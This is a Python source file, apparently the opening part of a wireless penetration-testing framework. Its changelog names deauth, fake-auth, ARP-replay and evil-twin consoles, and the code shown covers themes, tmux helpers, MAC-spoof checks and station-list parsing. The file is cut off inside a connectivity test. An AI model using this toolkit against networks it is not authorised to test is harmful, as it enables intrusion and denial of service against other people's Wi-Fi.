#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
# Copyright (C) 2026 Astite Abdelkader
# ==========================================================================
# WSA FRAMEWORK · ENGINE  ·  wsa.py  ·  v3.1.0
# ==========================================================================
# REFERENCE ARCHIVE  ·  read this before touching anything below
# --------------------------------------------------------------------------
#
# ROLE
#   Single-file wireless security assessment engine.
#   Menu-driven. Every subsystem is a function in this file.
#   Worker panes re-exec this file with --role=<name>.
#
# SECTIONS
#   1  constants + JSON settings     6  settings screens      11  entry
#   2  UI primitives                 7  worker consoles
#   3  tmux + process helpers        8  analysis backends
#   4  adapter + target helpers      9  report + nist
#   5  recon + target selection     10  menus
#
# FILES
#   wsa_settings.json    persisted settings
#   .wsa_current         active assessment folder
#   /tmp/wsa_debug.log   conductor debug trace
#
# ROLE DISPATCH
#   python3 wsa.py                    → main menu
#   python3 wsa.py --role=capture     → capture console
#   python3 wsa.py --role=mac         → mac console
#   python3 wsa.py --role=ping        → ping console
#   python3 wsa.py --role=deauth      → deauth console
#   python3 wsa.py --role=fakeauth    → fake auth console
#   python3 wsa.py --role=arpreplay   → arp replay console
#   python3 wsa.py --role=evil_twin_personal   → evil twin psk
#   python3 wsa.py --role=evil_twin_enterprise → evil twin eap
#
# CHANGES
# --------------------------------------------------------------------------
# v3.1.0  ·  current
#   · worker panes: COMMANDS / ADAPTER / TARGET / OPTIONS unified layout
#   · real values substituted for <AP> <CH> <MON> <ADAPTER_MAC> <STATION_MAC>
#   · capture pane gains menu — Ctrl+C stops and returns, no auto-relaunch
#   · arp replay Ctrl+C: session-isolated child, killpg on interrupt
#   · fakeauth holds result on screen until Enter
#   · deauth uses spoofed MAC when present (OPEN), picker otherwise (WEP)
#   · own adapter MACs excluded from all station pickers
#   · recon parses station section of capture CSV — no rescan when populated
#   · master pane atomic single-write draw — no flicker, no bleeding
#   · master content drawn before pane split — procedure first, workers second
#   · auto flows: master stays static as procedure view during capture
#   · --auto no longer requires a recovery strategy (capture-only default)
#   · auto flow returns to main menu after card dismissal (no exit)
#   · classified result card: dynamic width (cap 76), force_red flag
#   · analysis console: card on every recovery action, Enter returns to menu
#   · analysis target menu, wordlist, mask all carry WSA/ADAPTERS header
#   · analysis wordlist + mask screens show TARGET + ARTIFACTS context
#   · hashcat: --potfile-disable on all invocations, fresh runs only
#   · hashcat: Intel iGPU safety — dual device without --force / -O
#   · hashcat/john: stop-on-first-crack watcher, 0.3s poll
#   · john: isolated pot (/tmp/wsa_john_<pid>_<ts>.pot), no cross-run pollution
#   · enterprise round window 180s, credential-count-based grace extension
#   · fast-exit: hold_briefly no-op in auto, restore_adapters idempotent
#   · root requirement at entry (fresh Kali compatible)
#   · SUDO_USER/LOGNAME/USER fallback for file ownership under sudo
#   · methodology: 'assessment reference' title, ASSESSMENT CRITERIA label
#   · methodology: OPERATIONAL SEQUENCE block dropped (was duplication)
#   · methodology: NIST family legend per protocol (contextual, not repetitive)
#   · methodology: REFERENCES section, 5-7 peer-reviewed citations per protocol
#   · methodology: single-line wrap at 88 cols preserves alignment
#   · procedure paged view: step header alone, body indented 16, wrap at 88
#   · report: NIST family legend appended after remediation controls
#   · mask menu: aligned example output column (?d?d... -> 24177314)
#   · dead code removed: 12 unused functions
#   · # patchN trailing markers removed
#   · section order renumbered monotonic (1 -> 14)
#   · OPEN step 2 vocabulary harmonized (Assign -> Spoof)
#   · tagline trimmed: MANUAL CONDUCTOR dropped (single-adapter design in README)
#
# v3.0.3
#   · monitor mode before recon — adapter set to monitor before airodump
#   · evil twin uses AP() not MONITOR() — dual adapter correctness
#   · report file plain text — strip ANSI on write, colour on screen only
#   · ESSID sanitised for folder names — no nested paths
#   · evil_kill_hostapd sleep order — no wasted half-second
#   · evil_run_hostapd dead try/except removed
#   · fakeauth no longer waits for a station — needs only bssid + own mac
#   · john --show detection — parse credential-shaped lines
# ==========================================================================

import os, re, sys, csv, json, time, signal, shutil, subprocess, tempfile, argparse, textwrap
try:
    import readline  # patch7: arrow key editing in input()
except ImportError:
    pass
import pwd
import shlex
import threading
import glob

# ═══════════════════════════════════════════════════════════════════════════
# SECTION 1 · CONSTANTS + JSON SETTINGS
# ═══════════════════════════════════════════════════════════════════════════

VERSION         = "3.1.0"
BASE            = os.path.dirname(os.path.abspath(__file__))
SESSION         = "wsa_framework"
SYSTEM_SETTINGS = "/etc/wsa/settings.json"        # patchB: package default
def _user_home():                                  # patchB: respect SUDO_USER
    u = os.environ.get("SUDO_USER")
    if u and u != "root":
        try:    return pwd.getpwnam(u).pw_dir
        except Exception: pass
    return os.path.expanduser("~")
USER_SETTINGS   = os.path.join(_user_home(), ".config", "wsa", "settings.json")
SETTINGS        = USER_SETTINGS                     # legacy alias

CURRENT_FILE    = os.path.join(BASE, ".wsa_current")
ASSESSMENTS_DIR = os.path.join(BASE, "assessments")
DEBUG_LOG       = "/tmp/wsa_debug.log"

HIDDEN_RE = re.compile(r'^<length:\s*\d+>$')
IFACE_RE  = re.compile(r'^[A-Za-z0-9_.:-]{1,32}$')

def _valid_iface(name):
    """Validate a Linux network interface name."""
    return bool(name) and bool(IFACE_RE.match(name))

DEFAULTS = {
    "monitor_adapter":    "wlan1",
    "ap_adapter":         "wlan1",
    "spoof_adapter":      "wlan0",
    "wordlists_dir":      "/home/wsa/Desktop/wsa/wordlists",
    "default_wordlist":   "8_numerical_wordlist.txt",
    "default_mask":       "",
    "enterprise_method":  "hashcat",
    "theme":              "amber",
    "title_theme":        None,
    "layout_theme":       None,
    "thresholds": {
        "iv_threshold":       50000,
        "station_timeout":    60,
        "deauth_stimulus":    30,
        "mac_capture_window": 60,
        "passive_window":     30,
        "forced_window":      90,
        "max_deauth_tries":   3,
        "rogue_round_window": 60,
        "rogue_enterprise_window": 180,   # enterprise EAP is slower
        "wep_arp_wait":       15,
        "station_scan_duration": 12,   # patch_stations: per-BSSID lock
        "rogue_retransmit_window": 10,
        "wep_first_stimulus_delay": 10,   # 5s settle + 5s settle-adjusted = ~15s from arpreplay
        "wep_stimulus_interval":    60,   # seconds between subsequent deauth bursts
        "station_wait_cycles":      3,    # OPEN/WEP: max 60s cycles before abort
        "rogue_max_rounds":         6,    # evil twin: max rounds before abort
    },
}

def _read_json_layer(path):
    try:
        if os.path.exists(path):
            with open(path) as f:
                return json.load(f)
    except Exception:
        pass
    return {}

def _merge_layer(base, layer):
    base.update({k: v for k, v in layer.items() if k != "thresholds"})
    if "thresholds" in layer:
        base["thresholds"].update(layer["thresholds"])
    return base

def load_settings():                                # patchB
    merged = json.loads(json.dumps(DEFAULTS))
    _merge_layer(merged, _read_json_layer(SYSTEM_SETTINGS))
    _merge_layer(merged, _read_json_layer(USER_SETTINGS))
    return merged

def save_settings(data=None):
    global CFG
    if data is not None:
        CFG = data
    try:
        os.makedirs(os.path.dirname(USER_SETTINGS), exist_ok=True)
        with open(USER_SETTINGS, "w") as f:
            json.dump(CFG, f, indent=2)
    except Exception:
        pass

CFG = load_settings()

def cfg_set(*keys, value):
    *path, last = keys
    node = CFG
    for k in path:
        node = node[k]
    node[last] = value
    save_settings()

def MONITOR():    return CFG["monitor_adapter"]
def AP():         return CFG["ap_adapter"]
def SPOOF():      return CFG["spoof_adapter"]
def THR(k):       return CFG["thresholds"].get(k, DEFAULTS["thresholds"][k])

# ═══════════════════════════════════════════════════════════════════════════
# SECTION 1.5 · COLOR THEMES (ported from assessment)
# ═══════════════════════════════════════════════════════════════════════════

THEMES = {
    "amber": {
        "R":   "\033[0m",                 "BG":  "\033[48;5;234m",
        "DIM": "\033[38;5;240m",          "LBL": "\033[38;5;137m",
        "VAL": "\033[38;5;222m",          "RDY": "\033[38;5;112m",
        "FCS": "\033[1m\033[38;5;255m",   "WHT": "\033[38;5;250m",
        "CNR": "\033[1m\033[38;5;178m",   "ERR": "\033[38;5;203m",
    },
    "green": {
        "R":   "\033[0m",                 "BG":  "\033[48;5;234m",
        "DIM": "\033[38;5;22m",           "LBL": "\033[38;5;34m",
        "VAL": "\033[38;5;40m",           "RDY": "\033[38;5;46m",
        "FCS": "\033[1m\033[38;5;46m",    "WHT": "\033[38;5;40m",
        "CNR": "\033[1m\033[38;5;82m",    "ERR": "\033[38;5;196m",
    },
    "blue": {
        "R":   "\033[0m",                 "BG":  "\033[48;5;234m",
        "DIM": "\033[38;5;24m",           "LBL": "\033[38;5;33m",
        "VAL": "\033[38;5;45m",           "RDY": "\033[38;5;51m",
        "FCS": "\033[1m\033[38;5;195m",   "WHT": "\033[38;5;153m",
        "CNR": "\033[1m\033[38;5;39m",    "ERR": "\033[38;5;196m",
    },
    "dark_blue": {
        "R":   "\033[0m",                 "BG":  "\033[48;5;234m",
        "DIM": "\033[38;5;18m",           "LBL": "\033[38;5;26m",
        "VAL": "\033[38;5;33m",           "RDY": "\033[38;5;51m",
        "FCS": "\033[1m\033[38;5;195m",   "WHT": "\033[38;5;111m",
        "CNR": "\033[1m\033[38;5;32m",    "ERR": "\033[38;5;196m",
    },
    "light_blue": {
        "R":   "\033[0m",                 "BG":  "\033[48;5;234m",
        "DIM": "\033[38;5;67m",           "LBL": "\033[38;5;117m",
        "VAL": "\033[38;5;159m",          "RDY": "\033[38;5;120m",
        "FCS": "\033[1m\033[38;5;231m",   "WHT": "\033[38;5;195m",
        "CNR": "\033[1m\033[38;5;153m",   "ERR": "\033[38;5;210m",
    },
    "military": {
        "R":   "\033[0m",                 "BG":  "\033[48;5;234m",
        "DIM": "\033[38;5;58m",           "LBL": "\033[38;5;100m",
        "VAL": "\033[38;5;143m",          "RDY": "\033[38;5;106m",
        "FCS": "\033[1m\033[38;5;222m",   "WHT": "\033[38;5;187m",
        "CNR": "\033[1m\033[38;5;143m",   "ERR": "\033[38;5;130m",
    },
    "interpol": {
        "R":   "\033[0m",                 "BG":  "\033[48;5;234m",
        "DIM": "\033[38;5;240m",          "LBL": "\033[38;5;27m",
        "VAL": "\033[38;5;196m",          "RDY": "\033[38;5;46m",
        "FCS": "\033[1m\033[38;5;231m",   "WHT": "\033[38;5;252m",
        "CNR": "\033[1m\033[38;5;27m",    "ERR": "\033[38;5;196m",
    },
    "nasa": {
        "R":   "\033[0m",                 "BG":  "\033[48;5;234m",
        "DIM": "\033[38;5;238m",          "LBL": "\033[38;5;27m",
        "VAL": "\033[38;5;196m",          "RDY": "\033[38;5;51m",
        "FCS": "\033[1m\033[38;5;231m",   "WHT": "\033[38;5;231m",
        "CNR": "\033[1m\033[38;5;27m",    "ERR": "\033[38;5;196m",
    },
    "matrix": {
        "R":   "\033[0m",                 "BG":  "\033[48;5;232m",
        "DIM": "\033[38;5;22m",           "LBL": "\033[38;5;40m",
        "VAL": "\033[38;5;46m",           "RDY": "\033[38;5;82m",
        "FCS": "\033[1m\033[38;5;82m",    "WHT": "\033[38;5;40m",
        "CNR": "\033[1m\033[38;5;46m",    "ERR": "\033[38;5;196m",
    },
    "magenta": {
        "R":   "\033[0m",                 "BG":  "\033[48;5;234m",
        "DIM": "\033[38;5;96m",           "LBL": "\033[38;5;127m",
        "VAL": "\033[38;5;170m",          "RDY": "\033[38;5;213m",
        "FCS": "\033[1m\033[38;5;225m",   "WHT": "\033[38;5;183m",
        "CNR": "\033[1m\033[38;5;170m",   "ERR": "\033[38;5;203m",
    },
    "monochrome": {
        "R":   "\033[0m",                 "BG":  "\033[48;5;234m",
        "DIM": "\033[38;5;240m",          "LBL": "\033[38;5;250m",
        "VAL": "\033[38;5;255m",          "RDY": "\033[38;5;255m",
        "FCS": "\033[1m\033[38;5;255m",   "WHT": "\033[38;5;250m",
        "CNR": "\033[1m\033[38;5;255m",   "ERR": "\033[38;5;255m",
    },
    "neo":          {"LBL": "\033[38;5;45m",  "WHT": "\033[38;5;51m",
                     "VAL": "\033[38;5;231m", "RDY": "\033[38;5;46m",
                     "DIM": "\033[38;5;24m",  "ERR": "\033[38;5;203m"},
    "military_red": {"LBL": "\033[38;5;160m", "WHT": "\033[38;5;180m",
                     "VAL": "\033[38;5;173m", "RDY": "\033[38;5;106m",
                     "DIM": "\033[38;5;94m",  "ERR": "\033[38;5;196m"},
    "orange":       {"LBL": "\033[38;5;208m", "WHT": "\033[38;5;214m",
                     "VAL": "\033[38;5;220m", "RDY": "\033[38;5;221m",
                     "DIM": "\033[38;5;130m", "ERR": "\033[38;5;196m"},
    "yellow":       {"LBL": "\033[38;5;220m", "WHT": "\033[38;5;226m",
                     "VAL": "\033[38;5;231m", "RDY": "\033[38;5;226m",
                     "DIM": "\033[38;5;136m", "ERR": "\033[38;5;203m"},
    "forest":       {"LBL": "\033[38;5;65m",  "WHT": "\033[38;5;71m",
                     "VAL": "\033[38;5;114m", "RDY": "\033[38;5;120m",
                     "DIM": "\033[38;5;22m",  "ERR": "\033[38;5;166m"},
    "olive":        {"LBL": "\033[38;5;58m",  "WHT": "\033[38;5;143m",
                     "VAL": "\033[38;5;179m", "RDY": "\033[38;5;106m",
                     "DIM": "\033[38;5;94m",  "ERR": "\033[38;5;130m"},
    "steel":        {"LBL": "\033[38;5;67m",  "WHT": "\033[38;5;117m",
                     "VAL": "\033[38;5;159m", "RDY": "\033[38;5;110m",
                     "DIM": "\033[38;5;59m",  "ERR": "\033[38;5;167m"},
    "crimson":      {"LBL": "\033[38;5;160m", "WHT": "\033[38;5;203m",
                     "VAL": "\033[38;5;217m", "RDY": "\033[38;5;156m",
                     "DIM": "\033[38;5;88m",  "ERR": "\033[38;5;196m"},
    "airodump":   {"LBL": "\033[38;5;137m", "WHT": "\033[97m",
                   "VAL": "\033[97m",        "RDY": "\033[38;5;112m",
                   "DIM": "\033[38;5;240m",  "ERR": "\033[38;5;203m"},
}

THEME_ORDER = [
    "amber", "green", "blue", "dark_blue", "light_blue", "military",
    "interpol", "nasa", "matrix", "magenta", "monochrome", "airodump",
    "neo", "military_red", "orange", "yellow", "forest", "olive",
    "steel", "crimson",
]

_LAYOUT_DEFAULTS = {
    "amber":      ("colour137", "colour220"),
    "green":      ("colour34",  "colour82"),
    "blue":       ("colour33",  "colour45"),
    "dark_blue":  ("colour26",  "colour32"),
    "light_blue": ("colour117", "colour159"),
    "military":   ("colour100", "colour143"),
    "interpol":   ("colour27",  "colour196"),
    "nasa":       ("colour27",  "colour51"),
    "matrix":     ("colour34",  "colour46"),
    "magenta":    ("colour127", "colour170"),
    "monochrome": ("colour245", "colour255"),
    "neo":          ("colour45",  "colour51"),
    "military_red": ("colour160", "colour173"),
    "orange":       ("colour208", "colour214"),
    "yellow":       ("colour220", "colour226"),
    "forest":       ("colour65",  "colour114"),
    "olive":        ("colour58",  "colour143"),
    "steel":        ("colour67",  "colour117"),
    "crimson":      ("colour160", "colour203"),
    "airodump":   ("colour137", "colour220"),
}

# Backfill partial theme dicts so _apply_all_themes() never KeyErrors.
for _name, _t in THEMES.items():
    _t.setdefault("R",   "\033[0m")
    _t.setdefault("BG",  "\033[48;5;234m")
    _t.setdefault("FCS", "\033[1m" + _t.get("WHT", "\033[38;5;250m"))
    _t.setdefault("CNR", "\033[1m" + _t.get("LBL", "\033[38;5;137m"))

R = BG = DIM = LBL = VAL = RDY = FCS = WHT = CNR = ERR = "\033[0m"

def _ensure_layout_keys():
    for name, (pane, active) in _LAYOUT_DEFAULTS.items():
        t = THEMES.setdefault(name, {})
        t.setdefault("PANE",        pane)
        t.setdefault("PANE_ACTIVE", active)

def _apply_all_themes():
    """Populate title and text colour globals from settings:
        CFG['theme']       -> text   (WHT, VAL, RDY, DIM, ERR)
        CFG['title_theme'] -> title  (LBL)   falls back to text theme
    tmux pane-title text colour is derived from LBL by
    _apply_tmux_theme()."""
    global LBL, WHT, VAL, RDY, DIM, ERR
    text_name  = CFG.get("theme", "amber")
    title_name = CFG.get("title_theme") or text_name
    text_t  = THEMES.get(text_name,  THEMES["amber"])
    title_t = THEMES.get(title_name, THEMES["amber"])
    LBL = title_t["LBL"]
    WHT = text_t["WHT"]
    VAL = text_t["VAL"]
    RDY = text_t["RDY"]
    DIM = text_t["DIM"]
    ERR = text_t["ERR"]

_settings_mtime = 0.0

# wsa_patch_engine_themes_fix applied
# module-level state for the ported theme engine
_tmux_theme_sig          = None
_border_highlight_state  = False
_settings_mtime          = 0.0

# initialise from CFG
_ensure_layout_keys()
_apply_all_themes()

def _apply_tmux_theme(force=False):
    """Apply layout palette to tmux borders and titles.

    pane-border-status is 'top' so the pane title bar is always drawn.
    Both pane-border-style and pane-active-border-style use the same
    colour: no focus highlight, uniform line across every pane.

    Memoized: skip the whole tmux IPC burst when the effective
    (layout, border, active, title) signature is unchanged.  Prevents
    redundant refresh-client redraws during pane deployment — the
    visible "shaking" on the target-selected screen.
    """
    global _tmux_theme_sig
    layout_name = CFG.get("layout_theme") or CFG.get("theme", "amber")
    theme       = THEMES.get(layout_name, THEMES["amber"])
    border      = theme.get("PANE",        "colour137")
    active      = theme.get("PANE_ACTIVE", "colour220")
    # pane-title text follows the current title (LBL) colour
    _m = re.match(r"\033\[38;5;(\d+)m", LBL)
    title = f"colour{_m.group(1)}" if _m else active

    sig = (layout_name, border, active, title)
    if not force and sig == _tmux_theme_sig:
        return
    _tmux_theme_sig = sig

    for opt, val in [("status", "off"), ("mouse", "on")]:
        _tmux("set-option", "-t", SESSION, opt, val)

    target = f"{SESSION}:0"

    for opt in [
        "pane-border-status", "pane-border-format", "pane-border-lines",
        "pane-border-style",  "pane-active-border-style",
    ]:
        _tmux("set-window-option", "-t", target, "-u", opt)

    fmt = f"#[fg={title}] #{{pane_title}} #[default]"

    # uniform border colour everywhere: no active-pane highlight
    for opt, val in [
        ("pane-border-status",       "top"),
        ("pane-border-format",       fmt),
        ("pane-border-lines",        "single"),
        ("pane-border-style",        f"fg={border}"),
        ("pane-active-border-style", f"fg={border}"),
    ]:
        _tmux("set-window-option", "-t", target, opt, val)

    _tmux("refresh-client")

def theme_settings():
    """Theme hub - text, title, and layout colour selection."""
    while True:
        clear()
        standard_header()
        print()
        print(rule("options"))
        print(f"       {WHT}1  text colour    (body, values, output){R}")
        print(f"       {WHT}2  title colour   (section headers, pane titles){R}")
        print(f"       {WHT}3  layout colour  (tmux borders){R}")
        print()
        sys.stdout.flush()
        try:
            choice = input(f"   {LBL}SELECT OPTION [0 to go back]:{R} ").strip()
        except (KeyboardInterrupt, EOFError):
            return
        if choice == "0" or not choice:
            return
        elif choice == "1":
            _pick_theme_for("theme")
        elif choice == "2":
            _pick_theme_for("title_theme")
        elif choice == "3":
            _pick_theme_for("layout_theme")

def _pane_to_ansi(spec):
    """Convert a tmux pane colour spec ('colour220') to an ANSI
    escape sequence so it renders as a real swatch in the terminal."""
    m = re.match(r"colour(\d+)", str(spec))
    if m:
        return f"\033[38;5;{m.group(1)}m"
    return "\033[38;5;137m"

def _pick_theme_for(which):
    """Palette picker.  which in {theme, title_theme, layout_theme}."""
    titles = {
        "theme":        "text colour",
        "title_theme":  "title colour",
        "layout_theme": "layout colour",
    }
    heading = titles.get(which, which)

    while True:
        # re-read every iteration so the marker follows the new
        # selection immediately after cfg_set()
        cur = CFG.get(which)
        follows = False
        if which in ("title_theme", "layout_theme") and cur is None:
            cur = CFG.get("theme", "amber")
            follows = True

        clear(); print(); print()
        standard_header()
        print()
        print(rule("options"))
        for i, name in enumerate(THEME_ORDER, 1):
            mark = f"  {RDY}\u2190 current{R}" if name == cur else ""
            if which in ("theme", "title_theme"):
                swatch = THEMES[name].get("LBL", "\033[38;5;137m")
            else:
                swatch = _pane_to_ansi(
                    THEMES[name].get("PANE_ACTIVE", "colour220"))
            print(f"       {WHT}{i:<3}{name:<14}{R}{swatch}\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588{R}{mark}")
        print()
        if which in ("title_theme", "layout_theme"):
            print(f"       {WHT}F  follow text colour{R}")
        print()
        sys.stdout.flush()
        try:
            sel = input(f"   {LBL}SELECT OPTION [0 to go back]:{R} ").strip()
        except (KeyboardInterrupt, EOFError):
            return
        if sel == "0" or not sel:
            return
        if sel.upper() == "F" and which in ("title_theme", "layout_theme"):
            cfg_set(which, value=None)
            _apply_all_themes()
            _apply_tmux_theme()
            return
        if sel.isdigit():
            n = int(sel)
            if 1 <= n <= len(THEME_ORDER):
                chosen = THEME_ORDER[n - 1]
                cfg_set(which, value=chosen)
                if which == "theme":
                    _apply_all_themes()
                    if not CFG.get("layout_theme"):
                        _apply_tmux_theme()
                elif which == "title_theme":
                    _apply_all_themes()
                    _apply_tmux_theme()
                elif which == "layout_theme":
                    _apply_tmux_theme()
                # stay on this screen so the change can be observed;
                # loop redraws with the new palette in effect

# ═══════════════════════════════════════════════════════════════════════════
# SECTION 2 · UI PRIMITIVES
# ═══════════════════════════════════════════════════════════════════════════

ANSI_RE = re.compile(r'\x1b\[[0-9;]*[A-Za-z]')

def strip_ansi(s):
    return ANSI_RE.sub('', s)

def restore():
    sys.stdout.write("\033[?25h\033[0m\033[?1049l")
    sys.stdout.flush()
    subprocess.run("stty sane", shell=True,
                   stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)

def clear():
    sys.stdout.write("\033[2J\033[H")  # patch5: keep scrollback
    sys.stdout.flush()
    pane = os.environ.get("TMUX_PANE")
    if pane:
        subprocess.run(["tmux", "clear-history", "-t", pane],
                       stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)

def width():
    try:
        r = subprocess.run(
            ["tmux", "display-message", "-p", "#{pane_width}"],
            capture_output=True, text=True)
        w = int(r.stdout.strip())
        if w > 0:
            return w
    except Exception:
        pass
    return shutil.get_terminal_size().columns

def set_pane_title(name):
    pane = os.environ.get("TMUX_PANE")
    if not pane:
        return
    try:
        subprocess.run(["tmux", "select-pane", "-t", pane, "-T", name],
                       stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    except Exception:
        pass

def rule(label=""):
    return f"   {LBL}{label.upper()}{R}" if label else ""

def row(label, value, vcolor=None):
    if vcolor is None:
        vcolor = WHT
    return f"       {WHT}{label:<12}{R} {vcolor}{value}{R}"

def iface_info(iface):
    mac  = "(not found)"
    mode = "unknown"
    try:
        with open(f"/sys/class/net/{iface}/address") as f:
            mac = f.read().strip().upper()
    except Exception:
        return mac, mode
    try:
        r = subprocess.run(["iw", "dev", iface, "info"],
                           capture_output=True, text=True, timeout=2)
        out = r.stdout.lower()
        if "type monitor" in out:
            mode = "monitor mode"
        elif "type managed" in out:
            mode = "managed mode"
        elif "type ap" in out:
            mode = "ap mode"
    except Exception:
        pass
    return mac, mode

def standard_header():
    """Master pane header. Owns exactly one blank line before WSA.
    Callers must NOT emit print() before calling. patch27."""
    m_mac, m_mode = iface_info(MONITOR())
    s_mac, s_mode = iface_info(SPOOF())
    print()
    print(rule("wsa"))
    print(f"       {WHT}WIRELESS SECURITY ASSESSMENT{R}")
    print()
    print(rule("adapters"))
    print(f"       {WHT}{MONITOR():<12}{m_mac:<22}{m_mode}{R}")
    print(f"       {WHT}{SPOOF():<12}{s_mac:<22}{s_mode}{R}")
    print()

# ═══════════════════════════════════════════════════════════════════════════
# SECTION 3 · TMUX + PROCESS HELPERS
# ═══════════════════════════════════════════════════════════════════════════

def _tmux(*args):
    return subprocess.run(["tmux", *args],
                          stdout=subprocess.PIPE,
                          stderr=subprocess.DEVNULL,
                          text=True)

def _run(cmd, timeout=15, capture=False):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.stdout if capture else r
    except Exception:
        return None

def dbg(msg):
    try:
        with open(DEBUG_LOG, "a") as f:
            f.write(f"{time.strftime('%H:%M:%S')}  {msg}\n")
    except Exception:
        pass

# ═══════════════════════════════════════════════════════════════════════════
# SECTION 4 · ADAPTER + TARGET HELPERS
# ═══════════════════════════════════════════════════════════════════════════

NM_DROPIN = "/etc/NetworkManager/conf.d/00-wsa.conf"

def _ensure_user_dir(path):
    """Create a folder owned by the invoking user, not root.

    When run under sudo, os.getuid() is 0, so a folder created here
    would be root-owned and a subsequent run without sudo would fail
    with PermissionError.  Resolve SUDO_USER to the real uid/gid,
    then chown the folder so ownership is consistent across runs.
    """
    if not path:
        return False
    target = os.path.abspath(path)

    sudo_user = os.environ.get("SUDO_USER")
    if sudo_user and sudo_user != "root":
        try:
            pw = pwd.getpwnam(sudo_user)
            uid, gid = pw.pw_uid, pw.pw_gid
        except Exception:
            uid, gid = os.getuid(), os.getgid()
    else:
        uid, gid = os.getuid(), os.getgid()

    try:
        os.makedirs(target, mode=0o755, exist_ok=True)
    except PermissionError:
        parent = os.path.dirname(target) or "."
        _sudo(["chown", f"{uid}:{gid}", parent])
        try:
            os.makedirs(target, mode=0o755, exist_ok=True)
        except Exception:
            return False
    except Exception:
        return False

    _sudo(["chown", "-R", f"{uid}:{gid}", target])
    try:
        os.chmod(target, 0o755)
    except Exception:
        pass
    return True

def _run_sudo(*c, timeout=15, capture=False):
    try:
        r = subprocess.run(["sudo", "-n", *c],
                           stdin=subprocess.DEVNULL,
                           stdout=subprocess.PIPE if capture else subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL,
                           text=True,
                           timeout=timeout)
        return r.stdout if capture else r
    except Exception:
        return None

def _sudo(cmd, timeout=15, quiet=True):
    """Run a command with sudo -n. Used by the automated flow engine."""
    full = ["sudo", "-n"] + list(cmd)
    try:
        return subprocess.run(
            full,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL if quiet else subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=timeout)
    except subprocess.TimeoutExpired:
        return None
    except Exception:
        return None

def load_target():
    if not os.path.exists(CURRENT_FILE):
        return None, {}
    try:
        folder = open(CURRENT_FILE).read().strip()
    except Exception:
        return None, {}
    info   = {}
    tf     = f"{folder}/target_info.txt"
    if os.path.exists(tf):
        for line in open(tf):
            if ":" in line:
                k, v = line.split(":", 1)
                info[k.strip().lower()] = v.strip()
    return folder, info

def _own_mac_set():
    """Every MAC our adapters can carry, for exclusion from station lists.
    Covers both live (spoofed / BSSID-cloned) and hardware MACs so a
    fake-authed adapter can never appear as a deauth target."""
    own = set()
    for iface in (MONITOR(), SPOOF(), AP()):
        if not _valid_iface(iface):
            continue
        for getter in (current_mac, original_mac):
            try:
                m = getter(iface)
                if m:
                    own.add(m.upper())
            except Exception:
                pass
    return own

def load_stations(folder, bssid=""):
    """Stations associated with bssid, own adapter MACs excluded."""
    own = _own_mac_set()

    det = f"{folder}/wsa_station_detected.csv"
    if os.path.exists(det):
        out = []
        for line in open(det):
            line = line.strip()
            if (not line or line.startswith("#")
                    or line.startswith("station_mac")):
                continue
            parts = line.split(",")
            if parts[0].strip():
                m = parts[0].strip().upper()
                if m and m not in own and m not in out:
                    out.append(m)
        if out:
            return out

    for prefix in ("capture-", "target_airodump-"):
        candidates = sorted([f for f in os.listdir(folder)
                             if f.startswith(prefix) and f.endswith(".csv")])
        if not candidates:
            continue
        path = os.path.join(folder, candidates[-1])
        out  = []
        in_station = False
        try:
            with open(path, errors="ignore") as f:
                for line in f:
                    row = line.split(",")
                    if not row:
                        continue
                    if "Station MAC" in row[0]:
                        in_station = True
                        continue
                    if in_station and len(row) >= 6:
                        mac   = row[0].strip().upper()
                        assoc = row[5].strip().upper()
                        if (assoc == bssid.upper() and mac
                                and not mac.startswith("FF:")
                                and mac != bssid.upper()
                                and mac not in own
                                and mac not in out):
                            out.append(mac)
        except Exception:
            pass
        if out:
            return out
    return []

def current_mac(iface):
    try:
        with open(f"/sys/class/net/{iface}/address") as f:
            return f.read().strip().upper()
    except FileNotFoundError:
        return None

def original_mac(iface):
    out = _run_sudo("ethtool", "-P", iface, timeout=3, capture=True)
    if out and "Permanent address:" in out:
        return out.split("Permanent address:")[1].strip().upper()
    return None

def is_spoofed(iface):
    o = original_mac(iface)
    c = current_mac(iface)
    if not o or not c:
        return False
    return o != c

def _connect_to_essid(iface, essid, timeout=25):
    """Ensure iface is associated to essid.
    If not associated, create/activate an NM profile via 'dev wifi connect'
    (works for OPEN networks with no credential prompt). Return True if
    the interface ends up on the target ESSID. Used by manual PING console
    and auto OPEN flow — neither had a connect step, so after MAC spoof
    NM restart alone never associated wlan0 to a fresh target SSID."""
    if not essid:
        return False
    def _current_conn():
        try:
            r = subprocess.run(
                ["nmcli", "-t", "-f", "DEVICE,STATE,CONNECTION",
                 "dev", "status"],
                capture_output=True, text=True, timeout=5)
            for line in r.stdout.splitlines():
                if line.startswith(f"{iface}:"):
                    parts = line.split(":")
                    if len(parts) >= 3:
                        return parts[2]
                    return ""
        except Exception:
            pass
        return ""
    if _current_conn() == essid:
        return True
    _run_sudo(["nmcli", "dev", "wifi", "connect", essid,
               "ifname", iface], timeout=timeout)
    time.sleep(2)
    if _current_conn() == essid:
        return True
    # small grace loop — DHCP + association can lag several seconds
    deadline = time.time() + timeout
    while time.time() < deadline:
        if _current_conn() == essid:
            return True
        time.sleep(1)
    return False

def _test_connectivity(iface):
    """Multi-layer connectivity test — returns a dict, does not print.

    Layers:
      ip          DHCP lease on iface (192.168.x.y/24)
      gw          default gateway reachable from route table
      local_icmp  gateway replies to ICMP
      http_ok     HTTP/HTTPS probe to captive.apple.com
      internet_icmp  8.8.8.8 replies to ICMP

    Verdict logic (caller decides): if ip + gw + (local_icmp OR http_ok
    OR internet_icmp), connectivity is CONFIRMED.  Guest APs frequently
    block ICMP-8.8.8.8 but allow HTTP — treating ICMP-only as the sole
    signal produces false negatives.  This helper separates the layers.
    """
    out = {"ip": None, "gw": None, "local_icmp": False,
           "http_ok": False, "internet_icmp": False, "http_code": ""}
    try:
        r = subprocess.run(["ip", "-4", "-br", "addr", "show", iface],
                           capture_output=True, text=True, timeout=3)
        for line in r.stdout.splitlines():
            parts = line.split()
            if len(parts) >= 3 and parts[0] == iface:
                out["ip"] = parts[2]
                break
    except Exception:
        pass
